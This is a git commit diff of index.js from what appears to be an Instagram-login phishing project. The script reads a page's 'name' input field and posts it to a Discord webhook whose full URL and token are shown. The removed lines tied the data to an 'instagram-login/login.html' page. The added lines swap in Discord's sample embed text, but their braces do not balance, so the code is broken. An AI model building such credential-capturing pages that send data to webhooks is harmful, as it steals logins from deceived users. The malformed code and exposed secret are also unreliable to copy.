12c11ae03ad66be0f5f720e2736db738ca2c3f99
instaposts <112507078+instaposts@users.noreply.github.com>
2022-08-31 14:16:26 +0300

    Update index.js

--- index.js
+++ index.js
@@ -5,32 +5,56 @@ const get_name = document.getElementById('name').value
 function send(){
 
   const data = {
-  "content": "null",
+    {
+  "username": "Webhook",
+  "avatar_url": "https://i.imgur.com/4M34hi2.png",
+  "content": "Text message. Up to 2000 characters.",
   "embeds": [
     {
-      "title": "b",
-      "url": "https://instaposts.github.io/instagram-login/login.html",
-      "description": get_name,
-      "color": 31228,
       "author": {
-        "name": "a"
+        "name": "Birdie♫",
+        "url": "https://www.reddit.com/r/cats/",
+        "icon_url": "https://i.imgur.com/R66g1Pe.jpg"
       },
-      "footer": {
-        "text": "Woah! So cool! :smirk:",
-        "icon_url": "https://i.imgur.com/fKL31aD.jpg"
+      "title": "Title",
+      "url": "https://google.com/",
+      "description": "Text message. You can use Markdown here. *Italic* **bold** __underline__ ~~strikeout~~ [hyperlink](https://google.com) `code`",
+      "color": 15258703,
+      "fields": [
+        {
+          "name": "Text",
+          "value": "More text",
+          "inline": true
+        },
+        {
+          "name": "Even more text",
+          "value": "Yup",
+          "inline": true
+        },
+        {
+          "name": "Use `\"inline\": true` parameter, if you want to display fields in the same line.",
+          "value": "okay..."
+        },
+        {
+          "name": "Thanks!",
+          "value": "You're welcome :wink:"
+        }
+      ],
+      "thumbnail": {
+        "url": "https://upload.wikimedia.org/wikipedia/commons/3/38/4-Nature-Wallpapers-2014-1_ukaavUI.jpg"
       },
       "image": {
         "url": "https://upload.wikimedia.org/wikipedia/commons/5/5a/A_picture_from_China_every_day_108.jpg"
       },
-      "thumbnail": {
-        "url": "https://upload.wikimedia.org/wikipedia/commons/3/38/4-Nature-Wallpapers-2014-1_ukaavUI.jpg"
+      "footer": {
+        "text": "Woah! So cool! :smirk:",
+        "icon_url": "https://i.imgur.com/fKL31aD.jpg"
       }
     }
-  ],
-  "username": "Webhook",
-  "avatar_url": "https://i.imgur.com/4M34hi2.png",
-  "attachments": []
-};
+  ]
+}
+}
+
   
   fetch('https://discord.com/api/webhooks/1014476514177327135/GtWMQX2rllqwn1UWEvOq8qmCpuXQs_ccZjFwUiKFIbjHIets4etkUpa0QusV2N7050S5', {
     method: 'POST', // or 'PUT'
